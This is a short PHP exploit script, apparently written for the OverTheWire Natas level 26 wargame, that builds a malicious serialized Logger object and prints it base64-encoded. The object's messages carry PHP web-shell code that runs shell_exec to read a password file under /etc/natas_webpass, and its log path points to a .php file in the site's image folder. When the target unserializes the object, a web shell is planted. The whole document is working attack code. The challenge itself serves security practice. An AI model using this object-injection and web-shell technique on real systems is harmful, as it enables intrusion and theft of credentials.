<?php
    class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;

        function __construct(){
            // initialise variables
            $this->initMsg="<?php echo shell_exec('cat /etc/natas_webpass/natas27'); ?>";
            $this->exitMsg="<?php echo shell_exec('cat /etc/natas_webpass/natas27'); ?>";
            $this->logFile = "img/tyrso.php";

            // write initial message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$this->initMsg);
            fclose($fd);
        }

        function log($msg){
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$msg."\n");
            fclose($fd);
        }

        function __destruct(){
            // write exit message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$this->exitMsg);
            fclose($fd);
        }
    }
$tmp = new Logger();
echo(base64_encode(serialize($tmp)));
